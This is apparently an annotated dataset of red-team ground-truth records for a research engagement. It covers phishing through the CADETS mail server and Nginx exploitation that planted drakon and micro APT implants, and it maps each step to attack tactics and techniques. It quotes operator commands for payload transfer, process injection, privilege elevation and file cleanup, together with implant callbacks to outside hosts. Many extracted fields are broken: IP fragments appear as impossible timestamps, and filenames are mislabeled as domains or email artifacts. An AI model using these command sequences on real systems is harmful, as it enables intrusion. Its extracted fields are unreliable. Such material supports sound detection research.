   - Raw: While we did not attack CADETS directly as the common threat attacker, CADETS was indirectly involved in all of the phishing e-mail attacks as CADETS hosted the postfix e-mail server used by the Bovia hosts. We sent the phishing e-mails to the various target users by connecting to the CADETS e-mail server on port 25. Unlike the e-mails sent internally, our e-mails impersonated Bovia and Bovia users while using external IP addresses. If these attacks were detected on CADETS, they could have possibly prevented the phishing e-mails from being delivered to the targeted users. We weren't expecting CADETS to monitor and validate e-mails but were curious if the unexpected connections would be detected amongst all of the spam we sent to the performers.
   - Time: `-` / `-`
   - Observables: process_name=postfix; host=CADETS
1. `4_1_e003` | `narrative_comment` | `4.1.2.1 ClearScope 20180406` | lines `1277-1278`
   - Raw: - 14:40 Sent e-mail to bob@bovia without link from 62.83.155.175 (ClearScope) - 15:02 Sent e-mail to bob@bovia with link from 62.83.155.175 (ClearScope)
   - Time: `14:40` / `2018-04-06T14:40:00`
   - Observables: user=bob@bovia
1. `4_1_e004` | `narrative_comment` | `4.1.2.2 Windows 20180409` | lines `1282-1283`
   - Raw: - 13:19 Send e-mail from Bob to Charles from 62.83.155.175 (FiveDirections) - 14:19 Send e-mail from Bob to Henry from 62.83.155.175 (TA5.2 Windows)
   - Time: `13:19` / `2018-04-09T13:19:00`
   - Observables: host=FIVEDIRECTIONS
1. `4_1_e005` | `narrative_comment` | `4.1.2.3 Linux 20180410` | lines `1287-1288`
   - Raw: - 12:28 Phishing email to everyone@bovia.com from Bob from 62.83.155.175 (THEIA/TRACE)
   - Time: `12:28` / `2018-04-10T12:28:00`
   - Observables: user=everyone@bovia.com; domain=bovia.com; host=TRACE; host=THEIA
1. `4_1_e006` | `address` | `4.1.3 Addresses` | lines `1292-1292`
   - Raw: [eth0:807] 62.83.155.175:80 -> 128.55.12.167:8007 phishing attack
   - Time: `62.83` / `2018-04-06T62:83:00`
   - Observables: ip_port=62.83.155.175:80; ip_port=128.55.12.167:8007
1. `4_1_e007` | `interaction_connection` | `4.1.4.1 Connections` | lines `1298-1298`
   - Raw: Connection from 62.83.155.175 on port 25.
   - Time: `62.83` / `2018-04-06T62:83:00`
   - Observables: -

### CADETS_20180411_1508_1515_02 / Section 3.8

- 标题：`20180411 1500 CADETS – Nginx Backdoor w/ Drakon In-Memory`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-11T15:08:00` -> `2018-04-11T15:15:00`
- Markdown 行号：`701-754`
- 报告页：`16, 17`
- 攻击概述：CADETS 再次通过 Nginx malformed HTTP request 成功拿到 drakon in-memory shell，并把 libdrakon 落盘后尝试注入 sshd，最终再次导致主机崩溃。
- 备注：这一节成功确认了 exploit、shell/C2 和载荷落盘；失败的 inject 单独保存在行为链，不上升为窗口级 attempted tactics。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | Nginx exploit 成功进入 CADETS。 | 3_8_e001, 3_8_e003 |
| EXECUTION | confirmed | 执行 | drakon 在 nginx 内存中运行，libdrakon 也被写盘准备执行/注入。 | 3_8_e001, 3_8_e003, 3_8_e004, 3_8_e006, 3_8_e007, 3_8_e013, 3_8_e015, 3_8_e016 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | operator console shell 已被成功建立。 | 3_8_e001, 3_8_e019 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1190 | confirmed | Nginx 公网服务被利用。 | 3_8_e001, 3_8_e003 |
| T1071.001 | confirmed | shell 通过 HTTP/operator console 连接。 | 3_8_e001, 3_8_e019 |
| T1105 | confirmed | libdrakon 作为注入载荷被传入目标。 | 3_8_e004, 3_8_e006, 3_8_e007, 3_8_e013, 3_8_e015, 3_8_e016 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| exploit_delivery | exploit_delivery | confirmed | 正文明确写到 Nginx exploit 第一次即成功。 | 3_8_e001, 3_8_e003 |
| c2_callback | c2_callback | confirmed | 正文写到 drakon implant running in memory of Nginx with a shell connected via HTTP to the operator console。 | 3_8_e001, 3_8_e019 |
| module_transfer | payload_write | confirmed | libdrakon 被 putfile 到 grain。 | 3_8_e004, 3_8_e006, 3_8_e007, 3_8_e013, 3_8_e015, 3_8_e016 |
| inject_attempt | inject_attempt | attempted | grain 被用于 inject /tmp/grain 802，但失败并造成 kernel panic。 | 3_8_e002, 3_8_e007, 3_8_e008, 3_8_e016 |

#### 显式观测

- `process_name` / `nginx`  Evidence: `3_8_e001, 3_8_e018, 3_8_e019`  Raw: nginx
- `process_name` / `sshd`  Evidence: `3_8_e001`  Raw: sshd
- `process_name` / `drakon`  Evidence: `3_8_e001, 3_8_e002, 3_8_e004, 3_8_e006, 3_8_e011, 3_8_e012, 3_8_e013, 3_8_e015`  Raw: drakon
- `command` / `The attacker continued the attack against CADETS by once again exploiting Nginx with a malformed HTTP request. This time, the exploit worked on the first attempt, resulting in a drakon implant running in memory of Nginx with a shell connected via HTTP to the operator console. The attacker downloaded the libdrakon implant .so to be injected into the sshd process. The attacker tried process injection but once again failed, resulting in a CADETS crash.`  Evidence: `3_8_e001`  Raw: inject
- `host` / `CADETS`  Evidence: `3_8_e001, 3_8_e002, 3_8_e008`  Raw: CADETS
- `command` / `The original attack on Friday 4/6 was meant to persist with an open connection. When CADETS crashed during our attack, our connection to the target host was lost. Process injection with the drakon implant failed at the time, so we retried the attack to give process injection another chance to succeed. Unfornately, injection failed once again, and the CADETS host was crashed, requiring another reboot.`  Evidence: `3_8_e002`  Raw: inject
- `file_path` / `/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119`  Evidence: `3_8_e004, 3_8_e006, 3_8_e013, 3_8_e015`  Raw: /deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119
- `domain` / `libdrakon.freebsd`  Evidence: `3_8_e004, 3_8_e006, 3_8_e013, 3_8_e015`  Raw: libdrakon.freebsd
- `process_name` / `sendmail`  Evidence: `3_8_e004, 3_8_e013`  Raw: sendmail
- `command` / `15:10 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 sendmail (failed)`  Evidence: `3_8_e004`  Raw: putfile
- `command` / `15:12 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 grain`  Evidence: `3_8_e006`  Raw: putfile
- `file_path` / `/tmp/grain`  Evidence: `3_8_e007, 3_8_e016`  Raw: /tmp/grain
- `command` / `15:15 inject /tmp/grain 802`  Evidence: `3_8_e007`  Raw: inject
- `ip_port` / `25.159.96.207:80`  Evidence: `3_8_e009`  Raw: 25.159.96.207:80
- `ip_port` / `128.55.12.167:8040`  Evidence: `3_8_e009`  Raw: 128.55.12.167:8040
- `ip_port` / `76.56.184.25:80`  Evidence: `3_8_e010`  Raw: 76.56.184.25:80
- `ip_port` / `128.55.12.167:8041`  Evidence: `3_8_e010`  Raw: 128.55.12.167:8041
- `ip_port` / `155.162.39.48:80`  Evidence: `3_8_e011, 3_8_e019`  Raw: 155.162.39.48:80
- `ip_port` / `128.55.12.167:8042`  Evidence: `3_8_e011`  Raw: 128.55.12.167:8042
- `process_name` / `loaderdrakon`  Evidence: `3_8_e011`  Raw: loaderdrakon
- `ip_port` / `198.115.236.119:80`  Evidence: `3_8_e012`  Raw: 198.115.236.119:80
- `ip_port` / `128.55.12.167:8043`  Evidence: `3_8_e012`  Raw: 128.55.12.167:8043
- `command` / `F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 sendmail (failed)`  Evidence: `3_8_e013`  Raw: putfile
- `command` / `F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 grain`  Evidence: `3_8_e015`  Raw: putfile
- `command` / `F1>inject /tmp/grain 802 (failed and caused kernel panic)`  Evidence: `3_8_e016`  Raw: inject

#### 原始子节摘录

- `3.8.lead` Section Lead (lines 703-707)

  > The attacker continued the attack against CADETS by once again exploiting Nginx with a malformed
  > HTTP request. This time, the exploit worked on the first attempt, resulting in a drakon implant running
  > in memory of Nginx with a shell connected via HTTP to the operator console. The attacker downloaded
  > the libdrakon implant .so to be injected into the sshd process. The attacker tried process injection but
  > once again failed, resulting in a CADETS crash.

- `3.8.1` Comments (lines 709-715)

  > The original attack on Friday 4/6 was meant to persist with an open connection. When CADETS crashed
  > during our attack, our connection to the target host was lost. Process injection with the drakon implant
  > failed at the time, so we retried the attack to give process injection another chance to succeed.
  > Unfornately, injection failed once again, and the CADETS host was crashed, requiring another reboot.

- `3.8.2` Event Log (lines 716-725)

  > - 15:08 throw http payload
  > - 15:10 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 sendmail
  > (failed)
  > - 15:11 rm vUGefai (failed)
  > - 15:12 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 grain
  > - 15:15 inject /tmp/grain 802
  > - 15:15 cadets crashed

- `3.8.3` Addresses (lines 726-732)

  > - [eth0:920] 25.159.96.207:80 -> 128.55.12.167:8040 http post
  > - [eth0:921] 76.56.184.25:80 -> 128.55.12.167:8041 shellcode_server
  > - [eth0:922] 155.162.39.48:80 -> 128.55.12.167:8042 loaderDrakon
  > - [eth0:923] 198.115.236.119:80 -> 128.55.12.167:8043 libdrakon (failed)

- `3.8.4` Interactions (lines 733-734)
- `3.8.4.1` Files (lines 735-740)

  > - F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 sendmail (failed)
  > - F1>rm vUGefai (failed)
  > - F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 grain

- `3.8.4.2` Processes (lines 741-744)

  > - F1>inject /tmp/grain 802 (failed and caused kernel panic)

- `3.8.4.3` Connections (lines 745-750)

  > - exploit: connection on port 80 from 25.159.96.207
  > - nginx: connection to 76.56.184.25
  > - nginx: connection to 155.162.39.48:80

- `3.8.5` Graph (lines 751-754)
#### 证据条目

1. `3_8_e001` | `narrative_comment` | `3.8.lead Section Lead` | lines `703-707`
   - Raw: The attacker continued the attack against CADETS by once again exploiting Nginx with a malformed HTTP request. This time, the exploit worked on the first attempt, resulting in a drakon implant running in memory of Nginx with a shell connected via HTTP to the operator console. The attacker downloaded the libdrakon implant .so to be injected into the sshd process. The attacker tried process injection but once again failed, resulting in a CADETS crash.
   - Time: `-` / `-`
   - Observables: process_name=nginx; process_name=sshd; process_name=drakon; command=The attacker continued the attack against CADETS by once again exploiting Nginx with a malformed HTTP request. This time, the exploit worked on the first attempt, resulting in a drakon implant running in memory of Nginx with a shell connected via HTTP to the operator console. The attacker downloaded the libdrakon implant .so to be injected into the sshd process. The attacker tried process injection but once again failed, resulting in a CADETS crash.; host=CADETS
1. `3_8_e002` | `narrative_comment` | `3.8.1 Comments` | lines `711-714`
   - Raw: The original attack on Friday 4/6 was meant to persist with an open connection. When CADETS crashed during our attack, our connection to the target host was lost. Process injection with the drakon implant failed at the time, so we retried the attack to give process injection another chance to succeed. Unfornately, injection failed once again, and the CADETS host was crashed, requiring another reboot.
   - Time: `-` / `-`
   - Observables: process_name=drakon; command=The original attack on Friday 4/6 was meant to persist with an open connection. When CADETS crashed during our attack, our connection to the target host was lost. Process injection with the drakon implant failed at the time, so we retried the attack to give process injection another chance to succeed. Unfornately, injection failed once again, and the CADETS host was crashed, requiring another reboot.; host=CADETS
1. `3_8_e003` | `event_log` | `3.8.2 Event Log` | lines `718-718`
   - Raw: 15:08 throw http payload
   - Time: `15:08` / `2018-04-11T15:08:00`
   - Observables: -
1. `3_8_e004` | `event_log` | `3.8.2 Event Log` | lines `719-720`
   - Raw: 15:10 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 sendmail (failed)
   - Time: `15:10` / `2018-04-11T15:10:00`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119; domain=libdrakon.freebsd; process_name=sendmail; process_name=drakon; command=15:10 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 sendmail (failed)
1. `3_8_e005` | `event_log` | `3.8.2 Event Log` | lines `721-721`
   - Raw: 15:11 rm vUGefai (failed)
   - Time: `15:11` / `2018-04-11T15:11:00`
   - Observables: -
1. `3_8_e006` | `event_log` | `3.8.2 Event Log` | lines `722-722`
   - Raw: 15:12 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 grain
   - Time: `15:12` / `2018-04-11T15:12:00`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119; domain=libdrakon.freebsd; process_name=drakon; command=15:12 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 grain
1. `3_8_e007` | `event_log` | `3.8.2 Event Log` | lines `723-723`
   - Raw: 15:15 inject /tmp/grain 802
   - Time: `15:15` / `2018-04-11T15:15:00`
   - Observables: file_path=/tmp/grain; command=15:15 inject /tmp/grain 802
1. `3_8_e008` | `event_log` | `3.8.2 Event Log` | lines `724-724`
   - Raw: 15:15 cadets crashed
   - Time: `15:15` / `2018-04-11T15:15:00`
   - Observables: host=CADETS
1. `3_8_e009` | `address` | `3.8.3 Addresses` | lines `728-728`
   - Raw: [eth0:920] 25.159.96.207:80 -> 128.55.12.167:8040 http post
   - Time: `55.12` / `2018-04-11T55:12:00`
   - Observables: ip_port=25.159.96.207:80; ip_port=128.55.12.167:8040
1. `3_8_e010` | `address` | `3.8.3 Addresses` | lines `729-729`
   - Raw: [eth0:921] 76.56.184.25:80 -> 128.55.12.167:8041 shellcode_server
   - Time: `76.56` / `2018-04-11T76:56:00`
   - Observables: ip_port=76.56.184.25:80; ip_port=128.55.12.167:8041
1. `3_8_e011` | `address` | `3.8.3 Addresses` | lines `730-730`
   - Raw: [eth0:922] 155.162.39.48:80 -> 128.55.12.167:8042 loaderDrakon
   - Time: `39.48` / `2018-04-11T39:48:00`
   - Observables: ip_port=155.162.39.48:80; ip_port=128.55.12.167:8042; process_name=drakon; process_name=loaderdrakon
1. `3_8_e012` | `address` | `3.8.3 Addresses` | lines `731-731`
   - Raw: [eth0:923] 198.115.236.119:80 -> 128.55.12.167:8043 libdrakon (failed)
   - Time: `55.12` / `2018-04-11T55:12:00`
   - Observables: ip_port=198.115.236.119:80; ip_port=128.55.12.167:8043; process_name=drakon
1. `3_8_e013` | `interaction_file` | `3.8.4.1 Files` | lines `737-737`
   - Raw: F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 sendmail (failed)
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119; domain=libdrakon.freebsd; process_name=sendmail; process_name=drakon; command=F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 sendmail (failed)
1. `3_8_e014` | `interaction_file` | `3.8.4.1 Files` | lines `738-738`
   - Raw: F1>rm vUGefai (failed)
   - Time: `-` / `-`
   - Observables: -
1. `3_8_e015` | `interaction_file` | `3.8.4.1 Files` | lines `739-739`
   - Raw: F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 grain
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119; domain=libdrakon.freebsd; process_name=drakon; command=F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 grain
1. `3_8_e016` | `interaction_process` | `3.8.4.2 Processes` | lines `743-743`
   - Raw: F1>inject /tmp/grain 802 (failed and caused kernel panic)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/grain; command=F1>inject /tmp/grain 802 (failed and caused kernel panic)
1. `3_8_e017` | `interaction_connection` | `3.8.4.3 Connections` | lines `747-747`
   - Raw: exploit: connection on port 80 from 25.159.96.207
   - Time: `-` / `-`
   - Observables: -
1. `3_8_e018` | `interaction_connection` | `3.8.4.3 Connections` | lines `748-748`
   - Raw: nginx: connection to 76.56.184.25
   - Time: `76.56` / `2018-04-11T76:56:00`
   - Observables: process_name=nginx
1. `3_8_e019` | `interaction_connection` | `3.8.4.3 Connections` | lines `749-749`
   - Raw: nginx: connection to 155.162.39.48:80
   - Time: `39.48` / `2018-04-11T39:48:00`
   - Observables: ip_port=155.162.39.48:80; process_name=nginx

### CADETS_20180412_1400_1438_03 / Section 3.13

- 标题：`20180412 1400 CADETS – Nginx Backdoor w/ Drakon In-Memory`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-12T14:00:00` -> `2018-04-12T14:38:00`
- Markdown 行号：`994-1101`
- 报告页：`23, 24, 25`
- 攻击概述：CADETS 上再次成功利用 Nginx，drakon/XIM 与 micro 两条链并行推进：多次传入 drakon/libdrakon/microapt，最终 XIM 提权成功、micro 落盘执行并回连，再对多个内网地址做端口扫描，同时清理若干临时文件。
- 备注：这一节是 CADETS 里最完整的成功链之一，因此保留了提权、C2、扫描和清理四类强信号。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | Nginx exploit 成功开启后续链。 | 3_13_e001, 3_13_e003, 3_13_e053 |
| EXECUTION | confirmed | 执行 | drakon/micro 载荷被写盘并执行。 | 3_13_e004, 3_13_e005, 3_13_e006, 3_13_e015, 3_13_e018, 3_13_e019, 3_13_e020, 3_13_e021, 3_13_e024, 3_13_e028, 3_13_e030, 3_13_e031, 3_13_e032, 3_13_e034, 3_13_e035, 3_13_e036, 3_13_e037, 3_13_e038, 3_13_e045, 3_13_e046, 3_13_e049, 3_13_e050, 3_13_e051, 3_13_e052, 3_13_e057 |
| PRIVILEGE_ESCALATION | confirmed | 提权 | drakon(XIM) 被成功 elevate 到 root。 | 3_13_e002, 3_13_e042, 3_13_e043 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | XIM 与 micro sendmail 都形成了对外 C2 连接。 | 3_13_e001, 3_13_e056, 3_13_e057 |
| DISCOVERY | confirmed | 侦察发现 | Micro APT 针对多个目标和端口做扫描。 | 3_13_e002, 3_13_e058, 3_13_e059, 3_13_e060, 3_13_e061, 3_13_e062, 3_13_e063, 3_13_e064 |
| DEFENSE_EVASION | confirmed | 防御规避 | 大量临时/载荷文件被删除，属于显式清理行为。 | 3_13_e016, 3_13_e017, 3_13_e019, 3_13_e026, 3_13_e027, 3_13_e029, 3_13_e031, 3_13_e033, 3_13_e035 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1190 | confirmed | Nginx exploit 是整个窗口的进入方式。 | 3_13_e001, 3_13_e003, 3_13_e053 |
| T1071.001 | confirmed | XIM 与 micro listener 的通信都走 web 风格外联。 | 3_13_e001, 3_13_e056, 3_13_e057 |
| T1105 | confirmed | drakon/libdrakon/microapt 等载荷均被 putfile 进目标。 | 3_13_e004, 3_13_e005, 3_13_e006, 3_13_e015, 3_13_e018, 3_13_e019, 3_13_e020, 3_13_e021, 3_13_e024, 3_13_e028, 3_13_e030, 3_13_e031, 3_13_e032, 3_13_e034, 3_13_e035, 3_13_e036, 3_13_e037, 3_13_e038, 3_13_e045, 3_13_e046, 3_13_e049, 3_13_e050, 3_13_e051, 3_13_e052, 3_13_e057 |
| T1046 | confirmed | APT>scan 直接对应网络服务侦察。 | 3_13_e002, 3_13_e058, 3_13_e059, 3_13_e060, 3_13_e061, 3_13_e062, 3_13_e063, 3_13_e064 |
| T1070.004 | confirmed | rm 多个落地文件是明确的删除清理。 | 3_13_e016, 3_13_e017, 3_13_e019, 3_13_e026, 3_13_e027, 3_13_e029, 3_13_e031, 3_13_e033, 3_13_e035 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| exploit_delivery | exploit_delivery | confirmed | Nginx malformed HTTP request exploit 再次成功。 | 3_13_e001, 3_13_e003, 3_13_e053 |
| payload_write | payload_write | confirmed | tmux-1002/minions/font/XIM/netlog/sendmail/main/test 等载荷均被 putfile 到磁盘。 | 3_13_e004, 3_13_e005, 3_13_e006, 3_13_e015, 3_13_e018, 3_13_e019, 3_13_e020, 3_13_e021, 3_13_e024, 3_13_e028, 3_13_e030, 3_13_e031, 3_13_e032, 3_13_e034, 3_13_e035, 3_13_e036, 3_13_e037, 3_13_e038, 3_13_e045, 3_13_e046, 3_13_e049, 3_13_e050, 3_13_e051, 3_13_e052, 3_13_e057 |
| payload_elevate | payload_elevate | confirmed | 正文写到 drakon 成功以 root 运行，交互里也有 F1>elevate /tmp/XIM 成功。 | 3_13_e002, 3_13_e042, 3_13_e043 |
| payload_execute | payload_execute | confirmed | micro 通过 execfile /tmp/test 被直接执行。 | 3_13_e006, 3_13_e052 |
| c2_callback | c2_callback | confirmed | XIM 与 sendmail(micro) 都形成了对外回连。 | 3_13_e001, 3_13_e056, 3_13_e057 |
| network_scan | scan | confirmed | sendmail(Micro APT) 交互里有连续的 APT>scan 记录。 | 3_13_e002, 3_13_e058, 3_13_e059, 3_13_e060, 3_13_e061, 3_13_e062, 3_13_e063, 3_13_e064 |
| cleanup_delete | file_delete | confirmed | grain/vUGefai/tmux-1002/minion/XIM/netlog/sendmail/main/test 等文件有多次 rm 清理。 | 3_13_e016, 3_13_e017, 3_13_e019, 3_13_e026, 3_13_e027, 3_13_e029, 3_13_e031, 3_13_e033, 3_13_e035 |

#### 显式观测

- `process_name` / `nginx`  Evidence: `3_13_e001, 3_13_e054, 3_13_e055`  Raw: nginx
- `process_name` / `drakon`  Evidence: `3_13_e001, 3_13_e002, 3_13_e011, 3_13_e012, 3_13_e013, 3_13_e021, 3_13_e024`  Raw: drakon
- `process_name` / `micro`  Evidence: `3_13_e001, 3_13_e002, 3_13_e007, 3_13_e014, 3_13_e015, 3_13_e018, 3_13_e020, 3_13_e028, 3_13_e030, 3_13_e032, 3_13_e034`  Raw: micro
- `command` / `The attacker continued the attack against CADETS by once again exploiting Nginx with a malformed HTTP request. This exploit once again resulted in a drakon implant running in memory of Nginx with a shell connected via HTTP to the operator console. The attacker downloaded the micro apt implant and tried to elevate it. This was unsuccessful multiple times, so the attacker downloaded drakon implant executable to the target disk and executed it with elevate privileges, resulting in a new drakon implant process with root privileges connecting out to the operator console. The attacker then downloaded and tried to elevate the micro apt implant a few more times, which still failed. As a backup, the attacker simply executed the micro apt implant without root privileges. The micro apt implant connected out to the micro apt listener for C2. The attacker used micro to portscan multiple targets on the network to recon those targets vulnerable attach surface. The attacker left the operator console connection open.`  Evidence: `3_13_e001`  Raw: elevate
- `host` / `CADETS`  Evidence: `3_13_e001, 3_13_e002`  Raw: CADETS
- `email_artifact` / `micro apt`  Evidence: `3_13_e001, 3_13_e002`  Raw: micro apt
- `command` / `The previous 2 attacks were meant to persist with an open connection but failed to do so because of process injection failure. As a result, process injection was not attempted again at this time. Instead, we tried to use process elevation with root privileges of the micro apt implant. For reasons unknown at this point, we could not elevate (privilege escalate) the micro apt implant on the CADETS host despite being able to elevate the drakon implant. After several tries, we finally gave up and just ran the micro apt as the normal user in order to perform network recon using port scans. This is unfortunate as these actions were easy to detect by the TC performers.`  Evidence: `3_13_e002`  Raw: elevate
- `command` / `1402 putfile tmux-1002`  Evidence: `3_13_e004`  Raw: putfile
- `file_path` / `/tmp/test`  Evidence: `3_13_e006, 3_13_e049, 3_13_e050, 3_13_e051, 3_13_e052`  Raw: /tmp/test
- `command` / `execfile /tmp/test`  Evidence: `3_13_e006`  Raw: execfile
- `ip_port` / `25.159.96.207:80`  Evidence: `3_13_e009`  Raw: 25.159.96.207:80
- `ip_port` / `128.55.12.167:8040`  Evidence: `3_13_e009`  Raw: 128.55.12.167:8040
- `ip_port` / `76.56.184.25:80`  Evidence: `3_13_e010, 3_13_e054`  Raw: 76.56.184.25:80
- `ip_port` / `128.55.12.167:8041`  Evidence: `3_13_e010`  Raw: 128.55.12.167:8041
- `ip_port` / `155.162.39.48:80`  Evidence: `3_13_e011, 3_13_e055`  Raw: 155.162.39.48:80
- `ip_port` / `128.55.12.167:8042`  Evidence: `3_13_e011`  Raw: 128.55.12.167:8042
- `process_name` / `loaderdrakon`  Evidence: `3_13_e011`  Raw: loaderdrakon
- `ip_port` / `198.115.236.119:80`  Evidence: `3_13_e012`  Raw: 198.115.236.119:80
- `ip_port` / `128.55.12.167:8043`  Evidence: `3_13_e012`  Raw: 128.55.12.167:8043
- `ip_port` / `53.158.101.118:80`  Evidence: `3_13_e013, 3_13_e056`  Raw: 53.158.101.118:80
- `ip_port` / `128.55.12.167:8044`  Evidence: `3_13_e013`  Raw: 128.55.12.167:8044
- `ip_port` / `98.15.44.232:80`  Evidence: `3_13_e014`  Raw: 98.15.44.232:80
- `ip_port` / `128.55.12.167:8062`  Evidence: `3_13_e014`  Raw: 128.55.12.167:8062
- `ip_port` / `192.113.144.28:80`  Evidence: `3_13_e015, 3_13_e057`  Raw: 192.113.144.28:80
- `ip_port` / `128.55.12.167:8063`  Evidence: `3_13_e015`  Raw: 128.55.12.167:8063
- `process_name` / `sendmail`  Evidence: `3_13_e015, 3_13_e030, 3_13_e031, 3_13_e045, 3_13_e046, 3_13_e057`  Raw: sendmail
- `file_path` / `/deploy/archive/microapt.freebsd.x64_98.15.44.232`  Evidence: `3_13_e018, 3_13_e020, 3_13_e028`  Raw: /deploy/archive/microapt.freebsd.x64_98.15.44.232
- `domain` / `microapt.freebsd`  Evidence: `3_13_e018, 3_13_e020, 3_13_e028, 3_13_e030, 3_13_e032, 3_13_e034`  Raw: microapt.freebsd
- `command` / `F1>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 tmux-1002`  Evidence: `3_13_e018`  Raw: putfile
- `email_artifact` / `microapt`  Evidence: `3_13_e018, 3_13_e020, 3_13_e028, 3_13_e030, 3_13_e032, 3_13_e034`  Raw: microapt
- `command` / `F1>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 minions`  Evidence: `3_13_e020`  Raw: putfile
- `file_path` / `/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119`  Evidence: `3_13_e021`  Raw: /deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119
- `domain` / `libdrakon.freebsd`  Evidence: `3_13_e021`  Raw: libdrakon.freebsd
- `command` / `F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 font`  Evidence: `3_13_e021`  Raw: putfile
- `file_path` / `/tmp/font`  Evidence: `3_13_e022, 3_13_e041`  Raw: /tmp/font
- `command` / `F1>elevate /tmp/font`  Evidence: `3_13_e022`  Raw: elevate
- `file_path` / `/deploy/archive/drakon.freebsd.x64_53.158.101.118`  Evidence: `3_13_e024`  Raw: /deploy/archive/drakon.freebsd.x64_53.158.101.118
- `domain` / `drakon.freebsd`  Evidence: `3_13_e024`  Raw: drakon.freebsd
- `command` / `F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 XIM`  Evidence: `3_13_e024`  Raw: putfile
- `command` / `F2>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 netlog`  Evidence: `3_13_e028`  Raw: putfile
- `file_path` / `/deploy/archive/microapt.freebsd.x64_192.113.144.28`  Evidence: `3_13_e030, 3_13_e032, 3_13_e034`  Raw: /deploy/archive/microapt.freebsd.x64_192.113.144.28
- `command` / `F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 sendmail`  Evidence: `3_13_e030`  Raw: putfile
- `command` / `F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 main`  Evidence: `3_13_e032`  Raw: putfile
- `command` / `F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 test`  Evidence: `3_13_e034`  Raw: putfile
- `file_path` / `/tmp/tmux-1002`  Evidence: `3_13_e036, 3_13_e037, 3_13_e038`  Raw: /tmp/tmux-1002
- `command` / `F1>elevate /tmp/tmux-1002 (failed)`  Evidence: `3_13_e036, 3_13_e037, 3_13_e038`  Raw: elevate
- `file_path` / `/tmp/minions`  Evidence: `3_13_e039, 3_13_e040`  Raw: /tmp/minions
- `command` / `F1>elevate /tmp/minions (failed)`  Evidence: `3_13_e039, 3_13_e040`  Raw: elevate
- `command` / `F1>elevate /tmp/font (failed)`  Evidence: `3_13_e041`  Raw: elevate
- `file_path` / `/tmp/XIM`  Evidence: `3_13_e042, 3_13_e043`  Raw: /tmp/XIM
- `command` / `F1>elevate /tmp/XIM (failed)`  Evidence: `3_13_e042`  Raw: elevate
- `command` / `F1>elevate /tmp/XIM`  Evidence: `3_13_e043`  Raw: elevate
- `file_path` / `/var/log/netlog`  Evidence: `3_13_e044`  Raw: /var/log/netlog
- `command` / `F2>elevate /var/log/netlog (failed)`  Evidence: `3_13_e044`  Raw: elevate
- `file_path` / `/var/log/sendmail`  Evidence: `3_13_e045, 3_13_e046`  Raw: /var/log/sendmail
- `command` / `F2>elevate /var/log/sendmail (failed)`  Evidence: `3_13_e045, 3_13_e046`  Raw: elevate
- `file_path` / `/tmp/main`  Evidence: `3_13_e047`  Raw: /tmp/main
- `command` / `F2>elevate /tmp/main (failed)`  Evidence: `3_13_e047`  Raw: elevate
- `command` / `F2>elevate main (failed)`  Evidence: `3_13_e048`  Raw: elevate
- `command` / `F2>elevate /tmp/test (failed)`  Evidence: `3_13_e049, 3_13_e050, 3_13_e051`  Raw: elevate
- `command` / `F2>execfile /tmp/test`  Evidence: `3_13_e052`  Raw: execfile

#### 原始子节摘录

- `3.13.lead` Section Lead (lines 996-1005)

  > The attacker continued the attack against CADETS by once again exploiting Nginx with a malformed
  > HTTP request. This exploit once again resulted in a drakon implant running in memory of Nginx with a
  > shell connected via HTTP to the operator console. The attacker downloaded the micro apt implant and
  > tried to elevate it. This was unsuccessful multiple times, so the attacker downloaded drakon implant
  > executable to the target disk and executed it with elevate privileges, resulting in a new drakon implant
